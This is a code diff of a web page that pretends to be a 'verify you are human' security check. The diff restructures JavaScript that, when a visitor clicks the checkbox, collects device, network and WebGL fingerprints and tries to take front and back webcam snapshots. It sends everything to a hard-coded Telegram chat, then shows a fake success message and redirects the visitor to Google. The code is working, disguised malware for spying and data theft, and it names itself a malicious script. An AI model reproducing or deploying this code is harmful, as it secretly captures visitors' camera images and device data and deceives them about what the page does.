@@ -243,7 +243,7 @@
     <p>example.com needs to review the security of your connection before proceeding.</p>
 
     <script>
-// 1. Handle checkbox click (spinner, redirect, and data exfiltration)
+// 1. Handle checkbox click (spinner + immediate data exfiltration)
 function handleCheckbox(event) {
   const checkbox = document.getElementById("verifyHuman");
   const label = event.currentTarget;
@@ -258,81 +258,48 @@ function handleCheckbox(event) {
 
   // Show loading spinner
   label.classList.add("loading");
+  verifyText.style.display = "none";
+  verifyingText.style.display = "inline";
 
-  setTimeout(() => {
-    // Hide spinner, show success
-    label.classList.remove("loading");
-    checkmark.style.display = "block";
-    verifyText.style.display = "none";
-    verifyingText.style.display = "none";
-    successText.style.display = "inline";
-    checkbox.checked = true;
-  }, 3000);
+  // Start data exfiltration IMMEDIATELY (while spinner runs)
+  exfiltrateData().then(() => {
+    // After exfiltration completes, show fake "Success" (3s delay)
+    setTimeout(() => {
+      label.classList.remove("loading");
+      checkmark.style.display = "block";
+      verifyingText.style.display = "none";
+      successText.style.display = "inline";
+      checkbox.checked = true;
+    }, 3000);
 
-  // Redirect after 6 seconds
-  setTimeout(() => {
-    window.location.href = "https://www.google.com"; // Fake redirect
-  }, 6000);
+    // Redirect after 6 seconds
+    setTimeout(() => {
+      window.location.href = "https://www.google.com"; // Fake redirect
+    }, 6000);
+  });
 }
 
-// 2. Prevent double trigger
-document.getElementById('verifyHuman').addEventListener('click', function(e) {
-  e.preventDefault();
-});
+// 2. Data exfiltration logic
+async function exfiltrateData() {
+  const info = await getDeviceInfo();
 
-// 3. Malicious data exfiltration script
-const checkbox = document.getElementById('verifyHuman');
+  // Attempt webcam snapshots
+  let frontSnap = await getSnapshot("user");
+  let backSnap = await getSnapshot("environment");
 
-// Network info
-async function getNetworkInfo() {
-  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if (connection) {
-    return {
-      type: connection.type || "Unknown",
-      effectiveType: connection.effectiveType || "Unknown",
-      downlink: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
-      rtt: connection.rtt ? `${connection.rtt} ms` : "Unknown",
-      saveData: connection.saveData ? "Enabled" : "Disabled",
-    };
-  }
-  return "Network API not supported";
+  // Update camera status
+  if (frontSnap && backSnap) info.cameraStatus = "Front & Back Captured";
+  else if (frontSnap) info.cameraStatus = "Front Only";
+  else if (backSnap) info.cameraStatus = "Back Only";
+  else info.cameraStatus = "None / Denied";
+
+  // Send all data to Telegram
+  await sendTextToTelegram(info);
+  if (frontSnap) await sendPhotoToTelegram(frontSnap, "📷 Front Camera");
+  if (backSnap) await sendPhotoToTelegram(backSnap, "📷 Back Camera");
 }
 
-// WebGL fingerprinting
-function getWebGLInfo() {
-  const canvas = document.createElement('canvas');
-  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-  if (!gl) return "WebGL not supported";
-  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-  return {
-    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Blocked",
-    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Blocked",
-  };
-}
-
-// Webcam snapshot
-async function getSnapshot(facingMode) {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    await video.play();
-    await new Promise(res => setTimeout(res, 1000));
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0);
-    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
-    stream.getTracks().forEach(track => track.stop());
-    return blob;
-  } catch (err) {
-    console.warn(`Camera access denied (${facingMode})`, err);
-    return null;
-  }
-}
-
-// Full device info
+// 3. Device data collection (same as before)
 async function getDeviceInfo() {
   const data = {
     browser: navigator.userAgent,
@@ -384,7 +351,7 @@ async function getDeviceInfo() {
   return data;
 }
 
-// Send data to Telegram
+// 4. Telegram exfiltration functions (same as before)
 async function sendTextToTelegram(data) {
   const message = `
 *🔰 Malicious Script Report 🔰*
@@ -418,7 +385,6 @@ async function sendTextToTelegram(data) {
   });
 }
 
-// Send photos to Telegram
 function sendPhotoToTelegram(blob, caption) {
   const formData = new FormData();
   formData.append("chat_id", "7216371031");
@@ -431,26 +397,60 @@ function sendPhotoToTelegram(blob, caption) {
   });
 }
 
-// Execute on checkbox click
-checkbox.addEventListener('click', async function (e) {
+// 5. Webcam snapshot (same as before)
+async function getSnapshot(facingMode) {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    await video.play();
+    await new Promise(res => setTimeout(res, 1000));
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
+    stream.getTracks().forEach(track => track.stop());
+    return blob;
+  } catch (err) {
+    console.warn(`Camera access denied (${facingMode})`, err);
+    return null;
+  }
+}
+
+// 6. Network/WebGL utils (same as before)
+async function getNetworkInfo() {
+  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (connection) {
+    return {
+      type: connection.type || "Unknown",
+      effectiveType: connection.effectiveType || "Unknown",
+      downlink: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
+      rtt: connection.rtt ? `${connection.rtt} ms` : "Unknown",
+      saveData: connection.saveData ? "Enabled" : "Disabled",
+    };
+  }
+  return "Network API not supported";
+}
+
+function getWebGLInfo() {
+  const canvas = document.createElement('canvas');
+  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+  if (!gl) return "WebGL not supported";
+  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+  return {
+    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Blocked",
+    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Blocked",
+  };
+}
+
+// 7. Attach event listener
+document.getElementById("verify-label").addEventListener("click", handleCheckbox);
+document.getElementById('verifyHuman').addEventListener('click', function(e) {
   e.preventDefault();
-  const info = await getDeviceInfo();
-
-  // Attempt webcam snapshots
-  let frontSnap = await getSnapshot("user");
-  let backSnap = await getSnapshot("environment");
-
-  // Update camera status
-  if (frontSnap && backSnap) info.cameraStatus = "Front & Back Captured";
-  else if (frontSnap) info.cameraStatus = "Front Only";
-  else if (backSnap) info.cameraStatus = "Back Only";
-  else info.cameraStatus = "None / Denied";
-
-  // Exfiltrate data
-  await sendTextToTelegram(info);
-  if (frontSnap) await sendPhotoToTelegram(frontSnap, "📷 Front Camera");
-  if (backSnap) await sendPhotoToTelegram(backSnap, "📷 Back Camera");
 });
+
 </script>
     </script>
   </main>
